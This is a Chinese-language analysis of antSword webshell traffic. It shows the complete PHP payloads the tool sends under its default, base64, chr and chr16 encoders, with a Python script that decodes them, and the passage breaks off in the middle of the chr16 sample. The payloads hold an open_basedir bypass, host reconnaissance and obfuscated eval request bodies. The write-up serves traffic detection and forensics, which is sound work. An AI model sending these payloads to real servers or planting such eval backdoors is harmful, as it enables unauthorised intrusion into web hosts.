# antSword 蚁剑 流量解析

蚁剑原生支持以下编解码器：

编码器：

- default
- base64
- chr
- chr16
- rot13

解码器：

- default
- base64
- rot13

不同的编解码器组合，会导致 webshell 的网络流量发生变化，编码器将影响蚁剑发送给 webshell 的流量数据，而解码器将影响 webshell 回复给蚁剑的流量数据

:::info 说明
下述的流量数据，默认均已进行过一次 URL Decode 处理，并加以 php format 格式化处理，以便于排除掉 URL Encode 对流量可读性的影响

以下的流量数据，皆产生自蚁剑的 “测试连接” 功能
:::

## 编码器：default

default 模式下，蚁剑将直接通过明文的形式直接传输 Webshell 数据，例如列出当前目录：

```shell
@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split("/;|:/", $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.6e00791381";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    };
};;
function asenc($out)
{
    return $out;
};
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "3359" . "dd1f7";
    echo @asenc($output);
    echo "d9aff" . "acf845";
}
ob_start();
try {
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $R = "{$D}";
    if (substr($D, 0, 1) != "/") {
        foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $R .= "{$L}:";
    } else {
        $R .= "/";
    }
    $R .= "	";
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R .= php_uname();
    $R .= "{$s}";
    echo $R;;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};
asoutput();
die();
```

## 编码器：base64

base64 模式下，蚁剑会将 Webshell 数据进行 base64 编码之后，再进行传输，在一定程度上可以规避对流量的模式匹配检测

```php
@eval(@base64_decode($_POST['y132bac01f3abe']));&y132bac01f3abe=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjU5YzY4YjUwN2QxIjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO31AY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiYzFlYiIuImY3OGQiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjY1YTIiLiI4OGFhIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=
```

进一步对传递的 base64 数据进行解析：

```php
@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split("/;|:/", $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.59c68b507d1";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    };
};;
function asenc($out)
{
    return $out;
};
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "c1eb" . "f78d";
    echo @asenc($output);
    echo "65a2" . "88aa";
}
ob_start();
try {
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $R = "{$D}";
    if (substr($D, 0, 1) != "/") {
        foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $R .= "{$L}:";
    } else {
        $R .= "/";
    }
    $R .= "	";
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R .= php_uname();
    $R .= "{$s}";
    echo $R;;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};
asoutput();
die();
```

可以看出还是同一套 payload，只是通过一层 base64 编码进行了规避

## 编码器：chr

顾名思义，将 payload 进行字符拆分，每个字符做 chr 处理

```php
shell=@eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(61).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(103).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(41).ChR(32).ChR(123).ChR(36).ChR(111).ChR(99).ChR(119).ChR(100).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(111).ChR(112).ChR(97).ChR(114).ChR(114).ChR(61).ChR(112).ChR(114).ChR(101).ChR(103).ChR(95).ChR(115).ChR(112).ChR(108).ChR(105).ChR(116).ChR(40).ChR(34).ChR(47).ChR(59).ChR(124).ChR(58).ChR(47).ChR(34).ChR(44).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(64).ChR(97).ChR(114).ChR(114).ChR(97).ChR(121).ChR(95).ChR(112).ChR(117).ChR(115).ChR(104).ChR(40).ChR(36).ChR(111).ChR(112).ChR(97).ChR(114).ChR(114).ChR(44).ChR(36).ChR(111).ChR(99).ChR(119).ChR(100).ChR(44).ChR(115).ChR(121).ChR(115).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(116).ChR(101).ChR(109).ChR(112).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(41).ChR(41).ChR(59).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(36).ChR(111).ChR(112).ChR(97).ChR(114).ChR(114).ChR(32).ChR(97).ChR(115).ChR(32).ChR(36).ChR(105).ChR(116).ChR(101).ChR(109).ChR(41).ChR(32).ChR(123).ChR(105).ChR(102).ChR(40).ChR(33).ChR(64).ChR(105).ChR(115).ChR(95).ChR(119).ChR(114).ChR(105).ChR(116).ChR(97).ChR(98).ChR(108).ChR(101).ChR(40).ChR(36).ChR(105).ChR(116).ChR(101).ChR(109).ChR(41).ChR(41).ChR(123).ChR(99).ChR(111).ChR(110).ChR(116).ChR(105).ChR(110).ChR(117).ChR(101).ChR(59).ChR(125).ChR(59).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(61).ChR(36).ChR(105).ChR(116).ChR(101).ChR(109).ChR(46).ChR(34).ChR(47).ChR(46).ChR(49).ChR(54).ChR(51).ChR(102).ChR(99).ChR(57).ChR(34).ChR(59).ChR(64).ChR(109).ChR(107).ChR(100).ChR(105).ChR(114).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(33).ChR(64).ChR(102).ChR(105).ChR(108).ChR(101).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(41).ChR(123).ChR(99).ChR(111).ChR(110).ChR(116).ChR(105).ChR(110).ChR(117).ChR(101).ChR(59).ChR(125).ChR(64).ChR(99).ChR(104).ChR(100).ChR(105).ChR(114).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(44).ChR(32).ChR(34).ChR(46).ChR(46).ChR(34).ChR(41).ChR(59).ChR(36).ChR(99).ChR(110).ChR(116).ChR(97).ChR(114).ChR(114).ChR(61).ChR(64).ChR(112).ChR(114).ChR(101).ChR(103).ChR(95).ChR(115).ChR(112).ChR(108).ChR(105).ChR(116).ChR(40).ChR(34).ChR(47).ChR(92).ChR(92).ChR(92).ChR(92).ChR(124).ChR(92).ChR(47).ChR(47).ChR(34).ChR(44).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(102).ChR(111).ChR(114).ChR(40).ChR(36).ChR(105).ChR(61).ChR(48).ChR(59).ChR(36).ChR(105).ChR(60).ChR(115).ChR(105).ChR(122).ChR(101).ChR(111).ChR(102).ChR(40).ChR(36).ChR(99).ChR(110).ChR(116).ChR(97).ChR(114).ChR(114).ChR(41).ChR(59).ChR(36).ChR(105).ChR(43).ChR(43).ChR(41).ChR(123).ChR(64).ChR(99).ChR(104).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(46).ChR(46).ChR(34).ChR(41).ChR(59).ChR(125).ChR(59).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(44).ChR(34).ChR(47).ChR(34).ChR(41).ChR(59).ChR(64).ChR(114).ChR(109).ChR(100).ChR(105).ChR(114).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(98).ChR(114).ChR(101).ChR(97).ChR(107).ChR(59).ChR(125).ChR(59).ChR(125).ChR(59).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(123).ChR(114).ChR(101).ChR(116).ChR(117).ChR(114).ChR(110).ChR(32).ChR(36).ChR(111).ChR(117).ChR(116).ChR(59).ChR(125).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(123).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(61).ChR(111).ChR(98).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(111).ChR(110).ChR(116).ChR(101).ChR(110).ChR(116).ChR(115).ChR(40).ChR(41).ChR(59).ChR(111).ChR(98).ChR(95).ChR(101).ChR(110).ChR(100).ChR(95).ChR(99).ChR(108).ChR(101).ChR(97).ChR(110).ChR(40).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(50).ChR(98).ChR(54).ChR(100).ChR(50).ChR(34).ChR(46).ChR(34).ChR(101).ChR(49).ChR(101).ChR(97).ChR(100).ChR(55).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(64).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(49).ChR(57).ChR(102).ChR(34).ChR(46).ChR(34).ChR(53).ChR(56).ChR(100).ChR(53).ChR(34).ChR(59).ChR(125).ChR(111).ChR(98).ChR(95).ChR(115).ChR(116).ChR(97).ChR(114).ChR(116).ChR(40).ChR(41).ChR(59).ChR(116).ChR(114).ChR(121).ChR(123).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(68).ChR(61).ChR(61).ChR(34).ChR(34).ChR(41).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(80).ChR(65).ChR(84).ChR(72).ChR(95).ChR(84).ChR(82).ChR(65).ChR(78).ChR(83).ChR(76).ChR(65).ChR(84).ChR(69).ChR(68).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(82).ChR(61).ChR(34).ChR(123).ChR(36).ChR(68).ChR(125).ChR(9).ChR(34).ChR(59).ChR(105).ChR(102).ChR(40).ChR(115).ChR(117).ChR(98).ChR(115).ChR(116).ChR(114).ChR(40).ChR(36).ChR(68).ChR(44).ChR(48).ChR(44).ChR(49).ChR(41).ChR(33).ChR(61).ChR(34).ChR(47).ChR(34).ChR(41).ChR(123).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(114).ChR(97).ChR(110).ChR(103).ChR(101).ChR(40).ChR(34).ChR(67).ChR(34).ChR(44).ChR(34).ChR(90).ChR(34).ChR(41).ChR(97).ChR(115).ChR(32).ChR(36).ChR(76).ChR(41).ChR(105).ChR(102).ChR(40).ChR(105).ChR(115).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(41).ChR(41).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(59).ChR(125).ChR(101).ChR(108).ChR(115).ChR(101).ChR(123).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(47).ChR(34).ChR(59).ChR(125).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(34).ChR(59).ChR(36).ChR(117).ChR(61).ChR(40).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(34).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(103).ChR(105).ChR(100).ChR(34).ChR(41).ChR(41).ChR(63).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(112).ChR(119).ChR(117).ChR(105).ChR(100).ChR(40).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(117).ChR(105).ChR(100).ChR(40).ChR(41).ChR(41).ChR(58).ChR(34).ChR(34).ChR(59).ChR(36).ChR(115).ChR(61).ChR(40).ChR(36).ChR(117).ChR(41).ChR(63).ChR(36).ChR(117).ChR(91).ChR(34).ChR(110).ChR(97).ChR(109).ChR(101).ChR(34).ChR(93).ChR(58).ChR(64).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(117).ChR(114).ChR(114).ChR(101).ChR(110).ChR(116).ChR(95).ChR(117).ChR(115).ChR(101).ChR(114).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(112).ChR(104).ChR(112).ChR(95).ChR(117).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(123).ChR(36).ChR(115).ChR(125).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(36).ChR(82).ChR(59).ChR(59).ChR(125).ChR(99).ChR(97).ChR(116).ChR(99).ChR(104).ChR(40).ChR(69).ChR(120).ChR(99).ChR(101).ChR(112).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(36).ChR(101).ChR(41).ChR(123).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(69).ChR(82).ChR(82).ChR(79).ChR(82).ChR(58).ChR(47).ChR(47).ChR(34).ChR(46).ChR(36).ChR(101).ChR(45).ChR(62).ChR(103).ChR(101).ChR(116).ChR(77).ChR(101).ChR(115).ChR(115).ChR(97).ChR(103).ChR(101).ChR(40).ChR(41).ChR(59).ChR(125).ChR(59).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(59).ChR(100).ChR(105).ChR(101).ChR(40).ChR(41).ChR(59));
```

使用脚本对其进行解析：

```python
with open("./data.txt", "r") as f:
    data = f.read()

data = data.lower()
data = [i.split("(")[1].split(")")[0] for i in data.split(".")]

print("".join([chr(int(i)) for i in data]))
```

解码后得到：

```php
@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split("/;|:/", $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.163fc9";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    };
};;
function asenc($out)
{
    return $out;
};
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "2b6d2" . "e1ead7";
    echo @asenc($output);
    echo "19f" . "58d5";
}
ob_start();
try {
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $R = "{$D}";
    if (substr($D, 0, 1) != "/") {
        foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $R .= "{$L}:";
    } else {
        $R .= "/";
    }
    $R .= " ";
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R .= php_uname();
    $R .= "{$s}";
    echo $R;;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};
asoutput();
die();
```

## 编码器：chr16

本质上与 chr 编码器相同，只是其中的值换为十六进制格式

```php
shell=@eVAl(cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x64).ChR(0x69).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x65).ChR(0x72).ChR(0x72).ChR(0x6f).ChR(0x72).ChR(0x73).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x69).ChR(0x6d).ChR(0x65).ChR(0x5f).ChR(0x6c).ChR(0x69).ChR(0x6d).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x30).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x3d).ChR(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x6f).ChR(0x70).ChR(0x65).ChR(0x6e).ChR(0x5f).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x20).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x63).ChR(0x77).ChR(0x64).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x53).ChR(0x43).ChR(0x52).ChR(0x49).ChR(0x50).ChR(0x54).ChR(0x5f).ChR(0x46).ChR(0x49).ChR(0x4c).ChR(0x45).ChR(0x4e).ChR(0x41).ChR(0x4d).ChR(0x45).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x3d).ChR(0x70).ChR(0x72).ChR(0x65).ChR(0x67).ChR(0x5f).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x2f).ChR(0x3b).ChR(0x7c).ChR(0x3a).ChR(0x2f).ChR(0x22).ChR(0x2c).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x70).ChR(0x75).ChR(0x73).ChR(0x68).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x2c).ChR(0x24).ChR(0x6f).ChR(0x63).ChR(0x77).ChR(0x64).ChR(0x2c).ChR(0x73).ChR(0x79).ChR(0x73).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x70).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x29).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x70).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x20).ChR(0x24).ChR(0x69).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x29).ChR(0x20).ChR(0x7b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x21).ChR(0x40).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x77).ChR(0x72).ChR(0x69).ChR(0x74).ChR(0x61).ChR(0x62).ChR(0x6c).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x69).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x29).ChR(0x29).ChR(0x7b).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x69).ChR(0x6e).ChR(0x75).ChR(0x65).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x3d).ChR(0x24).ChR(0x69).ChR(0x74).ChR(0x65).ChR(0x6d).ChR(0x2e).ChR(0x22).ChR(0x2f).ChR(0x2e).ChR(0x32).ChR(0x35).ChR(0x65).ChR(0x36).ChR(0x33).ChR(0x31).ChR(0x38).ChR(0x22).ChR(0x3b).ChR(0x40).ChR(0x6d).ChR(0x6b).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x21).ChR(0x40).ChR(0x66).ChR(0x69).ChR(0x6c).ChR(0x65).ChR(0x5f).ChR(0x65).ChR(0x78).ChR(0x69).ChR(0x73).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x29).ChR(0x7b).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x69).ChR(0x6e).ChR(0x75).ChR(0x65).ChR(0x3b).ChR(0x7d).ChR(0x40).ChR(0x63).ChR(0x68).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x74).ChR(0x6d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x6f).ChR(0x70).ChR(0x65).ChR(0x6e).ChR(0x5f).ChR(0x62).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x2e).ChR(0x2e).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x63).ChR(0x6e).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x72).ChR(0x3d).ChR(0x40).ChR(0x70).ChR(0x72).ChR(0x65).ChR(0x67).ChR(0x5f).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x2f).ChR(0x5c).ChR(0x5c).ChR(0x5c).ChR(0x5c).ChR(0x7c).ChR(0x5c).ChR(0x2f).ChR(0x2f).C